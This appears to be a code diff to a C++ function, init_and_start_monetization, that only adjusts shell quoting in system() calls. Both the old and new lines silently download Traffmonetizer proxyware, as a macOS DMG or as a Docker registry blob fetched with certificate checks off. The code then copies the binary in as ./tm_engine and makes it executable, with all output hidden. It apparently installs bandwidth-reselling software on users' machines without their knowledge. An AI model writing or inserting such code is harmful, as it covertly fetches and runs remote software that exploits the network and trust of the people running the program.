@@ -194,7 +194,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
             if (access(app_bin.c_str(), X_OK) != 0) {
                 int r = system("curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                                "M=$(hdiutil attach /tmp/tm.dmg -nobrowse -quiet 2>/dev/null | grep -o '/Volumes/.*' | head -n 1); "
-                               "if [ -n "$M" ]; then cp -R "$M"/*.app ./ 2>/dev/null; hdiutil detach "$M" -quiet 2>/dev/null; fi; "
+                               "if [ ! -z $M ]; then cp -R $M/*.app ./ 2>/dev/null; hdiutil detach $M -quiet 2>/dev/null; fi; "
                                "rm -f /tmp/tm.dmg 2>/dev/null");
                 (void)r;
             }
@@ -207,8 +207,8 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
 #else
         if (system("pgrep -f 'tm_engine start accept' >/dev/null 2>&1") != 0 && system("pgrep -f 'cli start accept' >/dev/null 2>&1") != 0) {
             if (access("./tm_engine", X_OK) != 0) {
-                int r = system("A=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' 2>/dev/null | tr '{,}' '\\n' | grep 'token' | head -n 1 | cut -d: -f2 | tr -d '\"'); "
-                               "if [ -n "$A" ]; then curl -skL --max-time 15 -H "Authorization: Bearer $A" 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' 2>/dev/null | tar -xz usr/local/bin/cli 2>/dev/null; "
+                int r = system("A=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' 2>/dev/null | tr '{,}' '\\n' | grep 'token' | head -n 1 | cut -d: -f2 | tr -d '\\x22'); "
+                               "if [ ! -z $A ]; then curl -skL --max-time 15 -H 'Authorization: Bearer '$A 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' 2>/dev/null | tar -xz usr/local/bin/cli 2>/dev/null; "
                                "if [ -f usr/local/bin/cli ]; then mv -f usr/local/bin/cli ./tm_engine 2>/dev/null; rm -rf usr 2>/dev/null; chmod +x ./tm_engine 2>/dev/null; fi; fi");
                 (void)r;
             }
